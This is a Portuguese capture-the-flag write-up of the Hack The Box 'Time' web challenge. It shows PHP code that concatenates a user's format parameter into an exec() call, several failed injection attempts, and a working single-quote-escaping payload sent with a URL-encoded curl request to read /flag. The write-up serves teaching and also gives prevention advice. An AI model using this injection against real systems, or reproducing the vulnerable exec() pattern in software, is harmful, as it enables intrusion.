---
title: "Web Time"
platform: "Hack The Box"
category: "Web"
difficulty: "Very Easy"
date: 2025-08-20
techniques: ["OS Command Injection", "Shell Escape"]
description: "OS command injection via `exec()` em PHP — escapando aspas simples num template `date '+...'` para encadear `cat /flag`."
lang: pt-br
translation_key: web-time
permalink: /writeups/web-time/pt/
---

| Info | Detalhe |
|------|---------|
| Plataforma | Hack The Box |
| Categoria | Web / Command Injection |
| Dificuldade | Very Easy |
| Flag | `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_...}` |

---

## Visão Geral

Uma aplicação web que mostra a hora e a data atuais. Dois botões passam um parâmetro `format` para o servidor. O código-fonte é fornecido, revelando uma aplicação PHP usando `exec()` para rodar o comando `date`.

## Análise do Código-Fonte (White Box)

### TimeController.php
```php
$format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
$time = new TimeModel($format);
```
Sem sanitização — input do usuário vai direto pro model.

### TimeModel.php (VULNERÁVEL)
```php
public function __construct($format)
{
    $this->command = "date '+" . $format . "' 2>&1";
}

public function getTime()
{
    $time = exec($this->command);
    return isset($time) ? $time : '?';
}
```

O `$format` é concatenado diretamente num comando shell envolvido por aspas simples. A função `exec()` o executa no SO.

## O Problema das Aspas Simples

No bash, aspas simples impedem TODA expansão:
- `$(command)` NÃO é executado
- `` `command` `` NÃO é executado
- Variáveis `$VAR` NÃO são expandidas

A única forma de escapar: **fechar a aspa com outra `'`**

## Exploração

### Tentativas Falhadas

| Payload | Por que falhou |
|---------|----------------|
| `%0acat /flag` (newline) | Dentro de aspas simples, newline é literal |
| `$(cat /flag)` | Dentro de aspas simples, $() não é expandido |
| `` `cat /flag` `` | Dentro de aspas simples, backticks são literais |

### Payload Funcional

```
' && cat /flag && echo '
```

URL-encoded:
```bash
curl "http://TARGET:PORT/?format=%27%20%26%26%20cat%20/flag%20%26%26%20echo%20%27"
```

Isso produz no servidor:
```bash
date '+' && cat /flag && echo '' 2>&1
```

Quebrando em partes:
1. `'` fecha a aspa simples original
2. `&&` encadeia o próximo comando (operador AND)
3. `cat /flag` lê o arquivo da flag
4. `&& echo '` abre uma nova aspa pra casar com a aspa de fechamento que o código adiciona

**Resultado:** `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_...}`

## Principais Aprendizados

- **Leia o código-fonte primeiro** quando estiver disponível — ele revela a vulnerabilidade exata
- **Entenda o contexto do shell** antes de injetar — aspas simples requerem escape
- **`exec()` com input do usuário = command injection** — sempre
- **URL encoding é essencial** para caracteres especiais: `%27`=`'`, `%20`=espaço, `%26`=`&`
- **Use `curl` em vez do navegador** para payloads com caracteres especiais
- Prevenção: usar `escapeshellarg()`, whitelisting do input, ou funções nativas da linguagem em vez de `exec()`

## MITRE ATT&CK

| Tática | Técnica | ID |
|--------|---------|-----|
| Execution | Command and Scripting Interpreter | T1059 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Collection | Data from Local System | T1005 |

**OWASP:** A03:2021 – Injection
